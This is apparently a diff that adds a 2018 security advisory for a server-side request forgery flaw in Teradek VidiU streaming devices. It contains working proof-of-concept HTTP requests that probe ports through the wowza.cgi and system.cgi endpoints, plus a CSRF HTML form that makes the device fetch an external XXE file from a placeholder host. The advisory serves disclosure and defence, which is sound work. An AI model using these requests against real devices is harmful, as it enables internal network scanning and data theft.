@@ -1,0 +1,118 @@
+Teradek VidiU Pro 3.0.3 SSRF Vulnerability
+
+
+Vendor: Teradek, LLC
+Product web page: https://www.teradek.com
+Affected version: VidiU, VidiU Mini, VidiU Pro
+                  3.0.3r32136
+                  3.0.2r31225
+                  2.4.10
+
+Summary: The Teradek VidiU gives you the freedom to broadcast live
+high definition video directly to the Web without a PC. Whether you're
+streaming out of a video switcher or wirelessly from your camera,
+VidiU allows you to go live when you want, where you want. VidiU
+offers API level integration with the Ustream, YouTube Live and
+Livestream platforms, which makes streaming to your channel as
+easy as logging into your account.
+
+Desc: A server-side request forgery (SSRF) vulnerability exists in
+the VidiU management interface within the RTMP settings and the Wowza
+server mode functionality. The application parses user supplied data
+in the GET parameters 'url' and 'xml_url' to construct a page request
+that loads the configuration for specific service. Since no validation
+is carried out on the parameters, an attacker can specify an external
+domain and force the application to make a HTTP request to an arbitrary
+destination host, including xml data parsing (XXE potential). This can
+be used by an external attacker for example to bypass firewalls and
+initiate a service and network enumeration on the internal network
+through the affected application.
+
+Tested on: lighttpd/1.4.48
+           lighttpd/1.4.31
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2018-5461
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5461.php
+
+
+02.03.2018
+
+--
+
+
+SSRF open port:
+---------------
+
+GET /cgi-bin/wowza.cgi?command=read_url&url=zeroscience.mk:443&_=1526243349301 HTTP/1.1 
+Host: 127.0.0.1:8090 
+ 
+
+HTTP/1.1 200 OK 
+Content-Type: application/json 
+Connection: close 
+Date: Sun, 13 May 2018 21:42:30 GMT 
+Server: lighttpd/1.4.31 
+Content-Length: 31 
+ 
+{"error":"invalid parameters"}
+
+
+SSRF closed port:
+-----------------
+
+GET /cgi-bin/wowza.cgi?command=read_url&url=zeroscience.mk:7777&_=1526243349301 HTTP/1.1 
+Host: 127.0.0.1:8090 
+
+
+HTTP/1.1 200 OK 
+Content-Length: 0 
+Connection: close 
+Date: Sun, 13 May 2018 21:43:30 GMT 
+Server: lighttpd/1.4.31
+
+
+===================================================
+
+
+SSRF closed port:
+-----------------
+
+GET /cgi-bin/system.cgi?command=rtmp&action=rtmp_xml_from_url&xml_url=zeroscience.mk:7777&_=1526244218671 HTTP/1.1 
+Host: 127.0.0.1:8090 
+
+
+{"result":"error", "error":"Curl error"}
+
+
+SSRF open port:
+---------------
+
+GET /cgi-bin/system.cgi?command=rtmp&action=rtmp_xml_from_url&xml_url=zeroscience.mk:443&_=1526244218671 HTTP/1.1 
+Host: 127.0.0.1:8090 
+
+
+{"result":"error", "error":"Bad request"}
+
+
+===================================================
+
+
+PoC CSRF Blind XXE SSRF OOB:
+----------------------------
+
+<html>
+  <body>
+    <form action="http://127.0.0.1:8090/cgi-bin/system.cgi">
+      <input type="hidden" name="command" value="rtmp" />
+      <input type="hidden" name="action" value="rtmp_xml_from_url" />
+      <input type="hidden" name="xml_url" value="http://site.tld/xxe.xml" />
+      <input type="hidden" name="_" value="1526244218671" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
